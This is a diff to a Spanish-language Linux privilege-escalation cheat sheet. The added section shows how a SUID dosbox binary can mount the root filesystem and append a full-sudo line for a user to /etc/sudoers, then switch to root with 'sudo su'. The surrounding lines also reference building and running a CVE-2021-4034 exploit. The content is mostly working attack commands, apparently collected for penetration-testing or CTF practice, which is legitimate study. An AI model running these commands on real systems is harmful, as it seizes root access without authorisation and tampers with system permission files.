@@ -52,6 +52,18 @@ Forma 2:
 ❯ make                     # Crear un compilado del binario 
 ❯ ./cve-2021-4034          # Ejecutar el binario 
 ```
+## Dosbox 
+```bash 
+# DOSBox es un emulador gratuito y de código abierto que permite ejecutar aplicaciones y juegos clásicos diseñados para MS-DOS en sistemas operativos modernos como Windows, macOS y Linux.
+
+-rwsr-xr-x 1 root root /usr/bin/dosbox
+
+❯ LFILE='/etc/sudoers'
+❯ dosbox -c 'mount c /' -c "echo user1 ALL=(ALL:ALL) ALL >> C:$LFILE" -c exit
+	# user1 = Es el nombre del usuario de la cuenta que tiene el permiso SUID 
+
+❯ sudo su   # Cambiar a root 
+```
 ## Find 
 ```bash 
 -rwsr-xr-x 1 root root /usr/bin/find 
